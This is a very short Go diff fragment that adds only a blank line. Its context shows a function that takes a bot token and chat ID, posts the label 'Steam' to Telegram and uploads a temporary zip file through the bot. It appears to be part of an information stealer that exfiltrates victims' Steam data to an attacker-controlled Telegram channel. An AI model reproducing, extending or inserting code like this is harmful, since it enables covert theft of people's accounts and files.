@@ -126,3 +126,4 @@ func Run(botToken, chatId string) {
 	requests.Send2TelegramMessage(botToken, chatId, "Steam")
     requests.Send2TelegramDocument(botToken, chatId, tempZip)
 }
+
